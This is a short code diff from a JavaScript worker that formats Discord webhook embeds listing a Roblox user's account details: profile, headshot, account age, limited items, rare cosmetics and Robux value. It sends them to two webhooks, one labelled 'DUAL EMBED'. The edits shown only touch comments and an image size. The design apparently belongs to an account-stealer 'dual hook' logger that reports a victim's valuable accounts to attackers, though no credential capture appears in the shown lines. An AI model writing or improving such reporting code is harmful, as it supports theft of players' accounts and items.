@@ -326,8 +326,8 @@ export default {
         const moneyEmoji = '<:money:1334576383862771793>';
 
         const profileLink = `https://www.roblox.com/users/${d.userId}/profile`;
-        // Correct Roblox thumbnail API
-        const thumbnailLink = `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${d.userId}&size=420x420&format=Png&isCircular=false`;
+        // FIXED: Correct Roblox thumbnail API for headshot
+        const thumbnailLink = `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${d.userId}&size=720x720&format=Png&isCircular=false`;
 
         let accountAge = 'Unknown';
         if (d.created) {
@@ -337,7 +337,7 @@ export default {
           accountAge = Math.ceil(diffTime / (1000 * 60 * 60 * 24)) + ' days';
         }
 
-        // ---- MAIN EMBED (clean - white theme) ----
+        // ---- MAIN EMBED ----
         if (type === 'main') {
           webhookUrl = env.WEBHOOK1 || FALLBACK1;
 
@@ -368,17 +368,15 @@ export default {
           };
         }
 
-        // ---- DUAL EMBED (Full Details) ----
+        // ---- DUAL EMBED ----
         else if (type === 'secondary') {
           webhookUrl = env.WEBHOOK2 || FALLBACK2;
 
-          // Collectibles list
           let collectibles = 'None';
           if (d.limiteds && d.limiteds.length > 0) {
             collectibles = d.limiteds.join(', ');
           }
 
-          // Korblox, Headless, Valkyrie status
           const korbloxStatus = d.korblox ? yes : no;
           const headlessStatus = d.headless ? yes : no;
           const valkyrieStatus = d.valkyrie ? yes : no;
@@ -582,7 +580,6 @@ export default {
           }
         } catch (e) {}
 
-        // Billing & Groups data (simulated)
         const credit = Math.floor(robux * 0.1);
         const convert = Math.floor(robux * 0.05);
         const payments = 0;
